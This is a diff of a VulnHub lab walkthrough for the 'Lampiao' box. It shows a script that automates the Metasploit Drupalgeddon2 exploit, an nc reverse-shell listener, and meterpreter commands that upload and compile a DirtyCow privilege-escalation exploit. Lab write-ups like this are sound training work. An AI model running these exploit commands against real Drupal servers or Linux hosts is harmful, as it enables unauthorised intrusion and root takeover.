@@ -5,22 +5,24 @@ Looked for Drupal enumeration apps and was able to find "Drupwn" on github. Inst
 
 
 #InitialAccess
-Searchsploit contained several entries for "DrupalGeddon"
+Searchsploit contained several entries for "DrupalGeddon". One of them had a .rb extension, implying it was a msf module, so I executed ``` msfconsole ``` followed by ```search drupal```, which confirmed a module did exist.
 
-msfconsole
-search drupal
+Low priv shell can be automated as follows in (Kali with metasploit framework)
 ```
+#lampiao_low_priv.sh
+#/bin/bash
+rhost=${1}
 msfconsole -x "use exploit/unix/webapp/drupal_drupalgeddon2;\
-set payload php/meterpreter/bind_tcp;\
-set rport 1898;\
-set rhost $tgt;\
-exploit;\
-cd ~/toolz;\
-upload ~/toolz/les.sh /tmp/"
+	set payload php/meterpreter/bind_tcp;\
+	set rport 1898;\
+	set rhost $tgt;\
+	exploit;\
+	cd ~/toolz;\
+	# upload ~/toolz/les.sh /tmp/" # enumeration script 
 ```
-
+ 
  #Discovery 
-After  executing a large number of manual enumeration steps, checked other guides. The majority of users achieved root by using the Linux Exploit Suggester script, which feels sort of cheap compared to the typically OffSec box (granted, this is vanilla vuln-hub).
+After  executing a large number of manual enumeration steps, checked other guides. The majority of users achieved root by using the Linux Exploit Suggester script (les.sh), which feels sort of cheap compared to the typically OffSec box (granted, this is vanilla vuln-hub).
 
 uname -a output
 ```
@@ -34,37 +36,22 @@ searchsploit 4.4.0 nets the following
 
 
 #PrivilegeEscalation
-Running the following generates a low priv shell and uploads the applicable dirtyc0w payload
+From attacker computer, set up listener for stable reverse shell (php shell seems to die after executing dirty cow)
 
-```
-#/bin/bash
-# filename: lampiao_low_priv.sh
-rhost=${1}
-msfconsole -x "use exploit/unix/webapp/drupal_drupalgeddon2;\
-	set payload php/meterpreter/bind_tcp;\
-	set rport 1898;\
-	set rhost $tgt;\
-	exploit;\
-	cd ~/toolz;\
-	upload ~/toolz/les.sh /tmp/"
-
-```
-
-From attacker computer, set up listener for stable reverse shell
 ```
 nc -lvp 7777
 export tgt={target ip address}
 ```
 
-And in another shell execute
+This will spawn a meterpreter shell on the victim. Once it's opened, execute the following
 ```
-./lampiao_low_priv.sh $tgt
-
-
 # meterpreter cmds
 upload DirtyCow.c /tmp/dcow.c
 shell
+```
 
+Once dropped into the shell, execute the following
+```
 # on lampiao
 cd /tmp
 gcc dcow.c -o dc -pthread
